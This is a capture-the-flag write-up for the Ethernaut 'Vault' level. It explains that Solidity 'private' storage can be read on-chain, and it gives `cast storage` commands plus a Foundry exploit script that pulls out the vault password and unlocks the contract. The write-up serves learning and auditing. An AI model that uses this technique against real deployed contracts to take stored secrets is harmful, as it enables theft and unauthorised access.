---
title: 'Vault - The Ethernaut'
cover: https://ethernaut.openzeppelin.com/imgs/Level8.svg
categories: ["ctf"]
tags: ["blockchain","ethernaut"]
date: 2025-09-18
lastmod: 2025-09-18
---

## Challenge Overview

This level involves a vault protected by a password stored as a private variable. The goal is to unlock the vault by discovering the password and calling the `unlock()` function. While the password is marked as `private`, all data stored on the blockchain is publicly accessible, allowing us to read it directly from storage.

---

## Challenge Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
```

---

## Exploit Explanation

The critical misunderstanding here is about the meaning of `private` in Solidity. While `private` prevents other contracts from directly accessing the variable, it **does not** make the data private on the blockchain. All contract storage is publicly readable on-chain.

The storage layout is as follows:
- Slot 0: `locked` (boolean, 1 byte)
- Slot 1: `password` (bytes32, 32 bytes)

We can directly read the password from storage slot 1 using blockchain exploration tools.

### Steps to extract the password:

1. **Read the storage slot**: Use `cast storage` to read the value at storage slot 1
2. **Decode the bytes32**: Convert the hex value to a human-readable string

```bash
# Read the password from storage slot 1
cast storage <YOUR_INSTANCE> 1 --rpc-url $SEPOLIA_URL

# Decode the bytes32 value to a string
cast parse-bytes32-string 0x412076657279207374726f6e67207365637265742070617373776f7264203a29
```

This reveals the password: `A very strong secret password :)`

---

## Exploit Script

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Vault.sol";

contract VaultSolution is Script {
    Vault public vaultInstance = Vault(<YOUR_INSTANCE>);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        // Check initial lock status
        console.log("Vault locked initially:", vaultInstance.locked());
        
        // Unlock the vault with the extracted password
        bytes32 password = "A very strong secret password :)";
        vaultInstance.unlock(password);
        
        // Verify the vault is now unlocked
        console.log("Vault locked after unlock:", vaultInstance.locked());
        
        vm.stopBroadcast();
    }
}
```

---

## Proof of Concept (PoC)

Execute the exploit with Foundry:

```bash
forge script script/VaultSolution.s.sol --rpc-url $SEPOLIA_URL --broadcast
```